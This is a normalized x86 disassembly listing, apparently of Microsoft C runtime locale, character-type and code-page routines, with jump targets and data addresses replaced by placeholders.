call sub_1001b46f
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x1
lea eax [ ebp - 0x10 ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_1002290c
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_1001b79d
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1001b74c
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x1
pop ebp
retn
sub_1001b7cb
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1001b46f
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x2
lea eax [ ebp - 0x10 ]
push eax
push 0x2
push [ ebp + 0x8 ]
call sub_1002290c
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_1001b81c
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1001b7cb
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x2
pop ebp
retn
sub_1001b84a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1001b46f
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_1002290c
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_1001b89b
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1001b84a
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
pop ebp
retn
sub_1001b8c9
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x48 ] ebx
cmp [ esi + 0x14 ] ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
lea eax [ esi + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov [ esi + 0xc0 ] ebx
mov [ esi + 0xc4 ] ebx
mov [ esi + 0xc8 ] r--data
mov [ esi + 0xcc ] r--data
mov [ esi + 0xd0 ] r--data
mov [ esi + 0xac ] 0x1
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
push 0x4
call sub_1001bcbc
push 0x2
mov edi 0x180
push edi
mov [ ebp - 0x2c ] eax
call sub_1001bd01
push 0x1
push edi
mov [ ebp - 0x1c ] eax
call sub_1001bd01
push 0x1
push edi
mov [ ebp - 0x20 ] eax
call sub_1001bd01
push 0x1
push 0x101
mov [ ebp - 0x28 ] eax
call sub_1001bd01
add esp 0x24
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x2c ] ebx
je r-xdata
push eax
movzx eax [ esi + 0x30 ]
push 0x1004
push eax
lea eax [ ebp - 0x4c ]
push ebx
push eax
call sub_1001df79
add esp 0x14
test eax eax
jne r-xdata
push [ ebp - 0x2c ]
call sub_1001a3eb
push [ ebp - 0x1c ]
call sub_1001a3eb
push [ ebp - 0x20 ]
call sub_1001a3eb
push [ ebp - 0x28 ]
call sub_1001a3eb
xor ebx ebx
add esp 0x10
inc ebx
jmp r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push [ ebp - 0x24 ]
call sub_1001a3eb
pop ecx
mov eax ebx
jmp r-xdata
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1001a809
leave
retn
cmp [ ebp - 0x20 ] ebx
je r-xdata
cmp [ ebp - 0x28 ] ebx
je r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] ebx
xor eax eax
mov ecx [ ebp - 0x24 ]
mov [ eax + ecx ] al
inc eax
cmp eax 0x100
jl r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x5
ja r-xdata
movzx eax [ ebp - 0x18 ]
mov [ ebp - 0x30 ] eax
cmp eax 0x1
jle r-xdata
mov eax [ ebp - 0x1c ]
push ebx
push ebx
push [ esi + 0x4 ]
add eax 0x100
push eax
push 0x100
push [ ebp - 0x24 ]
mov [ ebp - 0x40 ] eax
push 0x1
push ebx
call sub_10022aab
add esp 0x20
test eax eax
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x24 ]
push ebx
push [ esi + 0x4 ]
mov edi 0xff
push edi
add ecx 0x81
push ecx
push edi
inc eax
push eax
push 0x100
push [ esi + 0x14 ]
push ebx
call sub_1001b6dd
add esp 0x24
test eax eax
je r-xdata
lea eax [ ebp - 0x11 ]
mov eax [ ebp - 0x28 ]
push ebx
push [ esi + 0x4 ]
add eax 0x81
push edi
push eax
mov eax [ ebp - 0x24 ]
push edi
inc eax
push eax
push 0x200
push [ esi + 0x14 ]
push ebx
call sub_1001b6dd
add esp 0x24
test eax eax
je r-xdata
movzx edi [ eax - 0x1 ]
movzx ecx cl
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov edi [ ebp - 0x20 ]
lea ecx [ eax + 0xfe ]
xor edx edx
cmp [ ebp - 0x30 ] 0x1
mov [ ecx ] dx
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x3c ] ecx
lea ecx [ edi + 0x80 ]
mov [ edi + 0x7f ] bl
mov [ edx + 0x7f ] bl
mov [ ecx ] bl
mov [ ebp - 0x44 ] ecx
lea ecx [ edx + 0x80 ]
mov [ ebp - 0x38 ] ecx
mov [ ecx ] bl
jle r-xdata
cmp edi ecx
jle r-xdata
push 0xfe
lea ecx [ eax + 0x200 ]
push ecx
push eax
call sub_10019cf0
push 0x7f
lea eax [ edi + 0x100 ]
push eax
push edi
call sub_10019cf0
mov eax [ ebp - 0x28 ]
push 0x7f
lea ecx [ eax + 0x100 ]
push ecx
push eax
call sub_10019cf0
mov eax [ esi + 0xc0 ]
add esp 0x24
cmp eax ebx
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x24 ]
mov [ edi + ecx ] 0x20
movzx ecx [ eax ]
inc edi
add eax 0x2
cmp [ eax - 0x1 ] bl
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] 0x1
mov [ esi + 0xc0 ] eax
mov eax [ ebp - 0x40 ]
mov [ esi + 0xc8 ] eax
mov eax [ ebp - 0x3c ]
mov [ esi + 0xc4 ] eax
mov eax [ ebp - 0x44 ]
mov [ esi + 0xcc ] eax
mov eax [ ebp - 0x38 ]
mov [ esi + 0xd0 ] eax
mov eax [ ebp - 0x30 ]
mov [ esi + 0xac ] eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x11 ]
mov [ ebp - 0x1c ] ecx
mov cl [ eax ]
cmp cl bl
je r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_1001a3eb
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_1001a3eb
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_1001a3eb
push [ esi + 0xc0 ]
call sub_1001a3eb
add esp 0x10
movzx ecx [ ecx - 0x1 ]
movzx edx dl
mov [ ebp - 0x20 ] ecx
cmp ecx edx
jg r-xdata
mov ecx [ ebp - 0x1c ]
add ecx 0x2
mov [ ebp - 0x1c ] ecx
cmp [ ecx - 0x1 ] bl
jne r-xdata
lea ecx [ eax + ecx * 2 + 0x100 ]
jmp r-xdata
mov dl [ ecx ]
cmp dl bl
je r-xdata
inc [ ebp - 0x20 ]
mov edx 0x8000
mov [ ecx ] dx
add ecx 0x2
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp - 0x1c ]
movzx ecx [ ecx ]
cmp [ ebp - 0x20 ] ecx
jle r-xdata
mov ecx [ ebp - 0x34 ]
sub_1001bcbc
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_1001aa2a
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_1001bd01
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001e869
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_1001bd4d
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10022aeb
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_1001bd9b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_1001be03
mov edi edi
push ebp
mov ebp esp
push esi
call sub_1001bdf0
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_1001bd9b
pop ecx
mov esi eax
call sub_1001bddd
mov [ eax ] esi
pop esi
pop ebp
retn
sub_1001be26
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_1001be59
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_1001bea3
mov edi edi
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
retn
test eax eax
je r-xdata
cmp eax esi
je r-xdata
push edi
push 0x36
pop ecx
mov edi eax
[ edi ] [ esi ]
and [ eax ] 0x0
push eax
call sub_1001ee05
pop ecx
pop edi
sub_1001bec9
push 0x8
push r--data
call sub_10020070
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_100200b5
retn
push 0xd
call sub_10023fbf
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001bf76
cmp [ esi ] 0x0
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax 0xbaadf00d
mov [ esi ] eax
mov [ esi + 0x4 ] eax
push esi
call sub_1001a3eb
pop ecx
push 0xc
call sub_10023fbf
pop ecx
mov [ ebp - 0x4 ] 0x1
push [ esi ]
call sub_1001ee94
pop ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001bf82
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_1001a3eb
pop ecx
cmp eax rw-data
je r-xdata
push eax
call sub_1001ef2d
pop ecx
sub_1001bf8b
mov edi edi
push ebp
mov ebp esp
push ebx
push edi
xor ebx ebx
xor edi edi
cmp [ ebp + 0x10 ] ebx
jle r-xdata
pop edi
pop ebx
pop ebp
retn
push esi
lea esi [ ebp + 0x10 ]
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1001ea23
int3
inc edi
cmp edi [ ebp + 0x10 ]
jl r-xdata
add esi 0x4
push [ esi ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10023ff2
add esp 0xc
test eax eax
jne r-xdata
pop esi
sub_1001bfcc
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push 0x90
xor ebx ebx
push ebx
push edi
call sub_1001a9b0
mov esi [ ebp + 0xc ]
mov al [ esi ]
add esp 0xc
test al al
jne r-xdata
cmp al 0x2e
jne r-xdata
xor eax eax
jmp r-xdata
push r--data
push esi
mov [ ebp + 0xc ] ebx
call sub_1001aba0
cmp eax ebx
jmp r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] bl
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
pop ecx
pop ecx
jne r-xdata
push 0xf
push eax
lea eax [ edi + 0x80 ]
push 0x10
push eax
call sub_1002405f
add esp 0x10
test eax eax
jne r-xdata
cmp [ ebp + 0xc ] 0x0
lea edi [ eax + esi ]
mov bl [ edi ]
jne r-xdata
or eax 0xffffffff
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ edi + 0x8f ] bl
jmp r-xdata
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp [ ebp + 0xc ] 0x2
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp bl 0x2e
je r-xdata
cmp eax 0x10
jae r-xdata
cmp bl 0x5f
je r-xdata
push eax
push esi
push 0x40
push [ ebp + 0x8 ]
jmp r-xdata
test bl bl
je r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x40
add eax 0x40
jmp r-xdata
call sub_1002405f
add esp 0x10
test eax eax
jne r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x10
sub eax 0xffffff80
cmp bl 0x2c
jne r-xdata
push eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
cmp bl 0x2c
je r-xdata
call sub_1001ea23
test bl bl
je r-xdata
inc [ ebp + 0xc ]
lea esi [ edi + 0x1 ]
push r--data
push esi
call sub_1001aba0
test eax eax
sub_1001c0eb
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001daf3
add esp 0xc
xor ebx ebx
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1001ea23
int3
lea eax [ esi + 0x40 ]
cmp [ eax ] bl
je r-xdata
lea eax [ esi + 0x80 ]
cmp [ eax ] bl
pop esi
pop ebx
je r-xdata
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001bf8b
add esp 0x14
pop ebp
retn
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001bf8b
add esp 0x14
sub_1001c156
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
inc ebx
push 0x355
mov [ ebp - 0xc ] ebx
call sub_1001bcbc
pop ecx
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
pop ebx
leave
retn
push edi
lea edi [ eax + 0x4 ]
mov [ edi ] 0x0
mov [ eax ] ebx
push [ esi + 0x58 ]
mov ebx 0x351
push r--data
push [ r--data ]
push 0x3
push ebx
push edi
call sub_1001bf8b
lea eax [ esi + 0x58 ]
add esp 0x18
mov [ ebp - 0x4 ] r--data
mov [ ebp - 0x8 ] eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1001ea23
mov eax [ ebp - 0x8 ]
lea ecx [ eax + 0x10 ]
push [ ecx ]
mov [ ebp - 0x8 ] ecx
push [ eax ]
call sub_1001dbd0
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi + 0x54 ]
cmp eax ebx
je r-xdata
push eax
call edi
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
push [ eax ]
add [ ebp - 0x4 ] 0xc
push r--data
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
push [ eax ]
push 0x3
push ebx
push edi
call sub_1001bf8b
add esp 0x18
cmp [ ebp - 0x4 ] r--data
jl r-xdata
and [ ebp - 0xc ] 0x0
mov eax [ esi + 0x68 ]
mov [ esi + 0x54 ] ebx
mov [ esi + 0x4c ] ebx
mov [ esi + 0x50 ] ebx
mov [ esi + 0x48 ] ebx
push eax
call edi
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_1001a3eb
pop ecx
push r--data
push ebx
push edi
call sub_10023ff2
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
push [ esi + 0x54 ]
call sub_1001a3eb
pop ecx
push [ ebp - 0x10 ]
call sub_1001a3eb
mov eax [ esi + 0x50 ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
pop ecx
cmp eax ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov ebx [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x54 ]
test eax eax
je r-xdata
push eax
call ebx
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
and [ esi + 0x54 ] 0x0
and [ esi + 0x4c ] 0x0
mov [ esi + 0x50 ] eax
mov [ esi + 0x48 ] edi
mov eax edi
jmp r-xdata
push eax
call ebx
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_1001a3eb
pop ecx
pop edi
push [ esi + 0x54 ]
call sub_1001a3eb
pop ecx
sub_1001c2bb
mov edi edi
push ebp
mov ebp esp
sub esp 0xb4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x9c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0xa4 ] edi
mov [ ebp - 0xa0 ] eax
call sub_1001e316
lea ecx [ eax + 0xc4 ]
mov [ ebp - 0xac ] ecx
lea ecx [ eax + 0xc8 ]
lea ebx [ eax + 0xbc ]
add eax 0x14b
mov [ ebp - 0xa8 ] ecx
mov [ ebp - 0x98 ] eax
test esi esi
je r-xdata
xor eax eax
cmp [ ebp - 0x9c ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ esi ] 0x43
jne r-xdata
push esi
call sub_1001cbb0
mov edi 0x83
pop ecx
mov [ ebp - 0xb0 ] eax
cmp eax edi
jae r-xdata
cmp [ esi + 0x1 ] 0x0
jne r-xdata
and [ ebp - 0xb4 ] 0x0
lea eax [ ebp - 0x94 ]
push esi
push eax
call sub_1001bfcc
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
push [ ebp - 0x98 ]
call sub_1001dbd0
pop ecx
pop ecx
test eax eax
je r-xdata
push r--data
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_1001daf3
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x94 ]
push eax
push ebx
push eax
call sub_100246a1
add esp 0xc
test eax eax
je r-xdata
xor esi esi
cmp [ ebp - 0xa4 ] esi
je r-xdata
push esi
push [ ebp - 0xa8 ]
call sub_1001dbd0
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
test edi edi
je r-xdata
movzx eax [ ebx + 0x4 ]
mov ecx [ ebp - 0xac ]
mov [ ecx ] eax
lea eax [ ebp - 0x94 ]
push eax
push edi
push [ ebp - 0x98 ]
call sub_1001c0eb
add esp 0xc
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0xa0 ] esi
je r-xdata
push 0x6
push ebx
push [ ebp - 0xa4 ]
call sub_10019cf0
add esp 0xc
mov eax [ ebp - 0xa0 ]
test eax eax
je r-xdata
mov [ edi ] ax
mov [ edi + 0x2 ] ax
mov [ edi + 0x4 ] ax
mov eax [ ebp - 0xb4 ]
mov esi r--data
mov eax [ ebp - 0xb0 ]
cmp eax edi
jb r-xdata
push [ ebp - 0x98 ]
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_1001daf3
add esp 0xc
test eax eax
jne r-xdata
push 0x4
push [ ebp - 0xac ]
push [ ebp - 0xa0 ]
call sub_10019cf0
add esp 0xc
mov eax [ ebp - 0x9c ]
jmp r-xdata
and [ eax ] 0x0
inc eax
push eax
push esi
push edi
push [ ebp - 0xa8 ]
call sub_1002405f
add esp 0x10
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
jmp r-xdata
mov eax [ ebp - 0x98 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1001a809
leave
retn
call sub_1001ea23
sub_1001c4dc
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx ecx
push edi
mov [ ebp - 0x190 ] ebx
mov [ ebp - 0x198 ] eax
call sub_1001e316
mov edi eax
push ebx
lea eax [ ebp - 0x1a4 ]
push eax
lea eax [ ebp - 0x1b0 ]
push eax
push 0x83
lea eax [ ebp - 0x88 ]
push eax
push [ ebp - 0x198 ]
call sub_1001c2bb
add esp 0x18
test eax eax
jne r-xdata
shl ebx 0x4
add ebx esi
push [ ebx + 0x48 ]
lea eax [ ebp - 0x88 ]
push eax
call sub_1001dbd0
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
lea eax [ ebp - 0x88 ]
push eax
call sub_1001cbb0
add eax 0x5
push eax
mov [ ebp - 0x18c ] eax
call sub_1001bcbc
pop ecx
pop ecx
mov [ ebp - 0x194 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x48 ]
jmp r-xdata
mov eax [ ebx + 0x48 ]
mov ecx [ ebp - 0x190 ]
mov [ ebp - 0x198 ] eax
lea eax [ esi + ecx * 4 + 0xc ]
mov [ ebp - 0x1a8 ] eax
mov eax [ eax ]
mov [ ebp - 0x1b8 ] eax
lea eax [ ecx + 0x6 ]
imul eax eax 0x6
add eax esi
push 0x6
push eax
mov [ ebp - 0x19c ] eax
lea eax [ ebp - 0x1c8 ]
push eax
call sub_10019cf0
mov eax [ esi + 0x4 ]
lea ecx [ ebp - 0x88 ]
push ecx
mov ecx [ ebp - 0x18c ]
mov [ ebp - 0x1b4 ] eax
mov eax [ ebp - 0x194 ]
add ecx 0xfffffffc
add eax 0x4
push ecx
push eax
call sub_1001daf3
add esp 0x18
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_1001a809
leave
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1001ea23
int3
mov eax [ ebp - 0x194 ]
mov ecx [ ebp - 0x1a8 ]
add eax 0x4
mov [ ebx + 0x48 ] eax
movzx eax [ ebp - 0x1b0 ]
mov [ ecx ] eax
push 0x6
lea eax [ ebp - 0x1b0 ]
push eax
push [ ebp - 0x19c ]
call sub_10019cf0
add esp 0xc
cmp [ ebp - 0x190 ] 0x2
jne r-xdata
cmp [ ebp - 0x190 ] 0x1
jne r-xdata
mov eax [ ebp - 0x1a4 ]
and [ ebp - 0x18c ] 0x0
mov [ esi + 0x4 ] eax
mov eax [ edi + 0x1f4 ]
mov ecx [ edi + 0x1f0 ]
mov [ ebp - 0x19c ] eax
lea eax [ edi + 0x1d0 ]
mov eax [ ebp - 0x190 ]
imul eax eax 0xc
push esi
call [ eax + r--data ]
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x1a4 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp - 0x18c ]
test eax eax
je r-xdata
mov edx [ eax ]
inc [ ebp - 0x18c ]
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ ebp - 0x1c0 ] edx
mov edx [ eax + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x1c0 ]
add eax 0x8
cmp [ ebp - 0x18c ] 0x5
mov [ ebp - 0x19c ] edx
jl r-xdata
cmp [ ebp - 0x198 ] rw-data
je r-xdata
mov eax [ ebp - 0x198 ]
push [ ebp - 0x194 ]
mov [ ebx + 0x48 ] eax
call sub_1001a3eb
mov eax [ ebp - 0x1b8 ]
pop ecx
mov ecx [ ebp - 0x1a8 ]
mov [ ecx ] eax
mov eax [ ebp - 0x1b4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x18c ] 0x5
jne r-xdata
lea eax [ edi + eax * 8 + 0x1d0 ]
mov edx [ eax ]
mov [ edi + 0x1d0 ] edx
mov edx [ eax + 0x4 ]
mov [ edi + 0x1d4 ] edx
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ eax + 0x4 ] ecx
mov edx [ esi + 0x4 ]
cmp edx [ eax ]
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x190 ]
mov eax [ ebp - 0x194 ]
add ecx 0x5
add ecx ecx
mov [ eax ] 0x1
mov [ esi + ecx * 8 ] eax
jmp r-xdata
mov edi [ ebp - 0x190 ]
add edi 0x5
add edi edi
push [ esi + edi * 8 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ edi + 0x1d4 ]
mov [ esi + 0xa8 ] eax
push 0x1
push [ esi + 0x14 ]
lea eax [ ebp - 0x188 ]
push [ esi + 0x4 ]
push eax
push 0x7f
push r--data
push 0x1
push 0x0
call sub_10022aab
add esp 0x20
test eax eax
je r-xdata
push [ esi + edi * 8 ]
call sub_1001a3eb
push [ ebx + 0x54 ]
call sub_1001a3eb
and [ ebx + 0x4c ] 0x0
pop ecx
pop ecx
and [ edi + 0x1d4 ] 0x0
xor eax eax
mov ecx 0x1ff
and [ ebp + eax * 2 - 0x188 ] cx
inc eax
cmp eax 0x7f
jb r-xdata
push 0xfe
push [ rw-data ]
lea eax [ ebp - 0x188 ]
push eax
call sub_10024892
add esp 0xc
neg eax
sbb eax eax
inc eax
mov [ edi + 0x1d4 ] eax
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x1d0 ] eax
sub_1001c816
mov edi edi
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
xor ebx ebx
mov esi edx
push edi
mov [ ebp - 0x98 ] esi
cmp ecx ebx
je r-xdata
mov [ ebp - 0x90 ] 0x1
mov [ ebp - 0x8c ] ebx
cmp eax ebx
je r-xdata
cmp eax ebx
je r-xdata
call sub_1001c156
cmp [ eax ] 0x4c
jne r-xdata
add ecx ecx
mov eax [ esi + ecx * 8 + 0x48 ]
jmp r-xdata
push eax
call sub_1001c4dc
pop ecx
jmp r-xdata
push ebx
push ebx
push ebx
push 0x83
lea ecx [ ebp - 0x88 ]
push ecx
push eax
call sub_1001c2bb
add esp 0x18
cmp eax ebx
je r-xdata
cmp [ eax + 0x1 ] 0x43
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1001a809
leave
retn
lea edi [ esi + 0x48 ]
cmp [ eax + 0x2 ] 0x5f
jne r-xdata
inc ebx
add edi 0x10
cmp ebx 0x5
